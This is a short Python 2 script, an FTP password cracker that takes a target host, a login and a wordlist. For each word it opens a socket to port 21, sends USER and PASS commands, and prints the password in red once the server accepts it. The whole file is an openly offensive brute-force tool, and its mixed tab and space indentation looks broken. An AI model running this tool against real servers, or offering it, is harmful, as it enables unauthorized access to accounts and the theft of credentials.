# -*- coding: utf-8 -*-

import socket
import sys
import time

banner = '''
	+ Cracker password ftp +
	'''
try:
        RED = '\033[1;31m'
	host = str(sys.argv[1])
	port = 21
	login = str(sys.argv[2])
	wordlist = str(sys.argv[3])

except IndexError:
	print banner
	print 'Usage: python %s <host> <login> <wordlist>\n' % sys.argv[0]
	sys.exit()

with open(wordlist) as senhas:
	passlists = []
	passwords = senhas.readlines()

	for passw in passwords:
		passlists.append(passw.strip('\n'))

print 'Cracking...\n'

for passw in passlists:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    cnct = s.recv(1024)
    
    s.send('USER ' + login + '\r\n')
    rr = s.recv(1024)
    
    s.send('PASS ' + passw + '\r\n')
    r = s.recv(1024)
    
    if( '230' in r ):
	print RED + '+++ password cracked +++ \n'
	print 'login: %s' % login
	print 'password: %s' % passw
	s.send('QUIT ' + '\r\n')
        break
        
    else:
        s.close()

